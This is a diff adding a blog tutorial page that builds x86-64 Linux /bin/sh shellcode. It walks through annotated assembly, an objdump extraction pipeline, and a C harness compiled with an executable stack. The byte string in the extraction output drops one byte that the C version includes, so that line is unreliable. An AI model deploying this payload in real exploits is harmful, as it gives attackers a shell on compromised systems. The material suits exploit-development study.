@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Assembly /bin/sh shellcode</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+</head>
+<body>
+<nav class="navbar navbar-inverse">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <a class="navbar-brand" href="#">WebSiteName</a>
+    </div>
+    <ul class="nav navbar-nav">
+      <li class="active"><a href="/subnetix.github.io/index.html">Home</a></li>
+    </ul>
+    <ul class="nav navbar-nav navbar-right">
+      <li><a href="/subnetix.github.io/me.html"><span class="glyphicon glyphicon-user"></span> About me</a></li>
+    </ul>
+  </div>
+</nav>
+<div class="container">
+	<h1>Assembly /bin/sh shellcode</h1>
+	<h3><p>We are going to create an assembler code that will allow us to execute a linux shell: /bin/sh.</p></h3>
+	<h3>Let's start : </h3>
+	<h4>Assembly code :</h4>
+	<code>
+		<xmp>
+section .text
+
+global _start
+_start:
+	push 59 <-- push 59 on the stack (59 = execve syscall)
+	pop rax <-- pop rax with 59
+	xor rsi, rsi <-- set rsi to 0
+	push rsi <-- push rsi on the stack
+	mov rdx, "//bin/sh" <-- put //bin/sh into rdx register
+	push rdx <-- push rdx register on the stack
+	xor rdx, rdx <-- set rsi to 0
+	mov rdi, rsp <-- set pointer
+	syscall <-- call kernel
+		</xmp>
+	</code>
+	<h4>Let's compile code :</h4>
+	<code>
+		<p>nasm -f elf64 shell.asm -o shell.o</p>
+		<p>ld shell.o -o shell</p>
+		<p>./shell</p>
+		<p>$ </p>
+	</code>
+	<h4>Fine it work !</h4>
+	<h4>So now let's build shellcode !</h4>
+	<code>
+		<p>--> objdump -d ./shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'</p>
+		<p>--> "\x6a\x3b\x58\x48\x31\xf6\x56\x48\xba\x2f\x2f\x62\x69\x2f\x73\x68\x52\x48\x31\xd2\x48\x89\xe7\x0f\x05"</p>
+	</code>
+	<h4>Now we have our shellcode</h4>
+	<h4>Let's create a C file to execute him</h4>
+	<code>
+		<xmp>
+#include <stdio.h>
+unsigned char shellcode[] = \
+"\x6a\x3b\x58\x48\x31\xf6\x56\x48\xba\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x52\x48\x31\xd2\x48\x89\xe7\x0f\x05";
+int main()
+{
+    printf("Shellcode lenght : %d\n", strlen(shellcode));
+    int (*ret)() = (int(*)())shellcode;
+    ret();
+}
+
+		</xmp>
+	</code>
+	<h4>Let's compile code :</h4>
+	<code>
+		<xmp>
+gcc shellcode.c -o shellcode -fno-stack-protector -z execstack
+./shellcode
+$
+		</xmp>
+	</code>
+	<h4>It work !</h4>
+</div>
+</body>
+</html>
